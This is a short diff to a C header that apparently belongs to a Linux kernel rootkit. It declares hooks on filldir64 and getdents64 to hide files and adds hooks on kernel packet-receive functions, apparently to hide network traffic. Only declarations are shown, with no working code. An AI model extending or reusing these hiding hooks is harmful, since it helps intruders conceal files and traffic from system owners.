@@ -10,3 +10,8 @@ HOOK_EXTERN(hide, filldir64);
 
 /// @brief Enable/disable hiding of configured files from the syscall `getdents64`
 HOOK_X64_SYSCALL_EXTERN(hide, getdents64);
+
+// HOOK_EXTERN(hide, netif_receive_skb);
+HOOK_EXTERN(hide, __netif_receive_skb);
+HOOK_EXTERN(hide, netif_rx);
+HOOK_EXTERN(hide, netif_receive_skb_list_internal)
